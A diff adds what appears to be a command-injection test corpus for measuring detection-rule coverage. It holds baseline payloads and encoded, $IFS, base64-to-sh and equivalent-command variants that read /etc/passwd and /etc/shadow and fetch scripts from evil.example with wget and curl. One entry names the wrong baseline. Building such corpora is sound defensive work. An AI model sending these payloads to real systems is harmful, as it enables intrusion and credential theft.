@@ -1,0 +1,28 @@
+// 命令注入语料
+// 列: id	类别	手法	位置	载荷	来源基线
+cmd-b01	CMD_INJECTION	baseline	query	host=1.1.1.1; whoami	-
+cmd-b02	CMD_INJECTION	baseline	query	file=| cat /etc/passwd	-
+cmd-b03	CMD_INJECTION	baseline	query	name=$(id)	-
+cmd-b04	CMD_INJECTION	baseline	query	url=; wget http://evil.example/x.sh	-
+cmd-b05	CMD_INJECTION	baseline	query	url=&& curl http://evil.example/x -o /tmp/x	-
+cmd-b06	CMD_INJECTION	baseline	query	log=; cat /etc/shadow	-
+// --- 变形 1:分隔符与参数之间用编码的空白 ---
+cmd-v01	CMD_INJECTION	separator-encode	query	host=1.1.1.1%3B%09whoami	cmd-b01
+cmd-v02	CMD_INJECTION	separator-encode	query	host=1.1.1.1;%09whoami	cmd-b01
+cmd-v03	CMD_INJECTION	separator-encode	query	file=%7C%20cat%20/etc/passwd	cmd-b02
+cmd-v04	CMD_INJECTION	separator-encode	query	name=%24%28id%29	cmd-b03
+cmd-v05	CMD_INJECTION	separator-encode	query	url=%3B%20wget%20http%3A%2F%2Fevil.example%2Fx.sh	cmd-b04
+cmd-v06	CMD_INJECTION	separator-encode	query	url=%26%26%20curl%20http%3A%2F%2Fevil.example	cmd-b05
+cmd-v07	CMD_INJECTION	separator-encode	query	log=%3B%20cat%20%2Fetc%2Fshadow	cmd-b06
+// --- 变形 2:IFS 之类的 shell 分隔技巧 ---
+cmd-v08	CMD_INJECTION	ifs-separator	query	host=1.1.1.1;cat$IFS/etc/passwd	cmd-b02
+cmd-v09	CMD_INJECTION	ifs-separator	query	file=|cat${IFS}/etc/passwd	cmd-b02
+// --- 变形 3:同语义换命令(归一化救不了,量规则覆盖缺口) ---
+cmd-v10	CMD_INJECTION	equivalent-command	query	file=| tac /etc/passwd	cmd-b02
+cmd-v11	CMD_INJECTION	equivalent-command	query	host=1.1.1.1; id	cmd-b01
+cmd-v12	CMD_INJECTION	equivalent-command	query	file=|head -c 999 /etc/passwd	cmd-b02
+// --- 变形 4:编码混淆 ---
+cmd-v13	CMD_INJECTION	base64-pipe	query	file=; echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh	cmd-b01
+cmd-v14	CMD_INJECTION	backslash-escape	query	host=1.1.1.1; w\hoami	cmd-b01
+// --- 对照 ---
+cmd-v15	CMD_INJECTION	duplicate-space	query	host=1.1.1.1;  whoami	cmd-b01
